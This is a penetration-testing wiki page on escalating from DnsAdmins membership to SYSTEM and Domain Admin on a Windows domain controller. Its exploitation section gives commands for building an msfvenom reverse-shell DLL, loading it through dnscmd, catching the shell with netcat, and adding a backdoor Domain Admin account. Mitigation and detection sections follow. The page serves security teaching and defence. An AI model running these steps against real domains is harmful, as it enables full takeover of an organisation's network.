# DnsAdmin

## Description

Users who are members of the group 'DnsAdmins' have the ability to abuse a feature in the Microsoft DNS management protocol to make the DNS server load any specified DLL. The service which in turn, executes the DLL is performed in the context of SYSTEM and could be used on a Domain Controller (Where DNS is usually running from) to gain Domain Administrator privileges.

## Enumeration

{% tabs %}
{% tab title="PowerView" %}
```bash
Get-NetGroupMember -Identity "DNSAdmins"
```
{% endtab %}

{% tab title="PowerShell" %}
```bash
Get-ADGroupMember -Identity "DnsAdmins"
```
{% endtab %}
{% endtabs %}

![](<../../../.gitbook/assets/image (1978).png>)

## Exploitation

This attack scenario takes places on a Windows Server 2019 Domain Controller where, an adversary has access to the user, Moe's credentials and is connected over `WinRM` from Kali Linux. Moe has been discovered to be a member of the DnsAdmins group.

![](<../../../.gitbook/assets/image (1980).png>)

`msfvenom` can then be used to create a malicious DLL that, when executed by DNS will connect back to the attackers machine in the context of SYSTEM on the Domain Controller.

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=80 -f dll > exploit.dll
```

![Creating the malicious DLL payload with msfvenom](<../../../.gitbook/assets/image (1981).png>)

Once the malicious DLL has been uploaded to the target the following command can be used to register the DLL.

```bash
dnscmd.exe <DCName> /config /serverlevelplugindll <PathToDLL>
dnscmd.exe dc01 /config /serverlevelplugindll C:\Users\Moe\Documents\exploit.dll
```

![Configuring a new malicious DLL](<../../../.gitbook/assets/image (1983).png>)

Over on the attackers system a `netcat` listener is set to listen in, on the port specified in the `msfvenom` command earlier.

```bash
# Attacker system
nc -lvp 80
```

From here stopping the DNS service and starting it again will spawn a SYSTEM shell to the `netcat` listener.

```bash
sc.exe stop dns
sc.exe start dns
```

{% hint style="info" %}
If the privileges of the current user do not allow for stopping or starting of the DNS service you may be able to complete the exploit by crashing the service or rebooting the target system to force a DNS restart.
{% endhint %}

The `netcat` shell should now connect as SYSTEM.

![Shell as SYSTEM](<../../../.gitbook/assets/image (1984).png>)

From here Domain Administrator persistence can be achieved. A new user can be created with Domain Administrator privileges.

```bash
net user Barney Password123 /add
net group "Domain Admins" /add Barney
```

![](<../../../.gitbook/assets/image (1985).png>)

![Domain Admins AD group](<../../../.gitbook/assets/image (1986).png>)

### Metasploit

```bash
use exploit/windows/local/dnsadmin_serverlevelplugindll
```

## Mitigation

* Ensure only admin accounts are members of the DNSAdmins group and ensure they only administer DNS from admin systems. Include DNSAdmins in the list of groups that membership is carefully scrutinized.
* Regularly review the DNS server object permissions for any group/account that shouldn’t have privileged access.
* Restrict RPC communication to DCs to only admin subnets.

## Detection

* Monitor for changes to `HKLM:\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` on DNS Servers

```bash
# Check with Powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

* Monitor for child processes spawned under DNS.exe on DNS servers.
* Audit ACL for write privilege to DNS server object and membership of DNSAdmins group
* Monitor event logs for ID 150 **\[Failure]** and ID 770 **\[Success]**

## Labs

{% tabs %}
{% tab title="Spoiler!" %}
```bash
Click the 'Show' tab to reveal online providers that use this attack vector
```
{% endtab %}

{% tab title="Show" %}
```bash
<Cyberseclabs>
Brute

<HackTheBox>
Resolute
```
{% endtab %}
{% endtabs %}

## References

* **\[General]** [https://adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)
* **\[Offensive]** [https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)
* **\[Detection]** [https://kb.eventtracker.com/evtpass/evtPages/EventId\_150\_Microsoft-Windows-DNS-Server-Service\_63580.asp](https://kb.eventtracker.com/evtpass/evtPages/EventId\_150\_Microsoft-Windows-DNS-Server-Service\_63580.asp)
